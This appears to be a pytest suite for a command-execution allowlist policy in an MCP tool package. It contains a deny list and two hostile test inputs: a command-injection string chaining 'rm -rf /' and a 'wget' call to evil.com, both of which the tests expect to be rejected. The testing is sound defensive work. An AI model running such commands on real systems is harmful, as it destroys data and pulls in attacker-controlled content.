"""Tests for command execution policy."""

from __future__ import annotations

from pathlib import Path

import pytest

from xnch_mcp.exec.policy import ExecDenied, load_exec_policy


@pytest.fixture
def policy_file(tmp_path: Path) -> Path:
    cfg = tmp_path / "exec-policy.yaml"
    cfg.write_text(
        """
defaults:
  timeout_seconds: 5
  max_output_bytes: 1024
  working_dir: /home/x-nch/xnchSystems
denied_substrings:
  - ";"
  - "sudo "
  - "systemctl restart"
hosts:
  node-a:
    allowed_prefixes:
      - systemctl status
      - hostname
  node-b:
    allowed_prefixes:
      - hostname
"""
    )
    return cfg


def test_load_policy(policy_file: Path) -> None:
    policy = load_exec_policy(policy_file)
    assert "node-a" in policy.hosts


def test_validate_allowed(policy_file: Path) -> None:
    policy = load_exec_policy(policy_file)
    argv, cwd = policy.validate("node-a", "systemctl status xnch.service")
    assert argv[0] == "systemctl"
    assert cwd.name == "xnchSystems"


def test_deny_metachar(policy_file: Path) -> None:
    policy = load_exec_policy(policy_file)
    with pytest.raises(ExecDenied):
        policy.validate("node-a", "hostname; rm -rf /")


def test_deny_not_in_allowlist(policy_file: Path) -> None:
    policy = load_exec_policy(policy_file)
    with pytest.raises(ExecDenied):
        policy.validate("node-a", "wget http://evil.com")


def test_deny_restart(policy_file: Path) -> None:
    policy = load_exec_policy(policy_file)
    with pytest.raises(ExecDenied):
        policy.validate("node-a", "systemctl restart xnch.service")
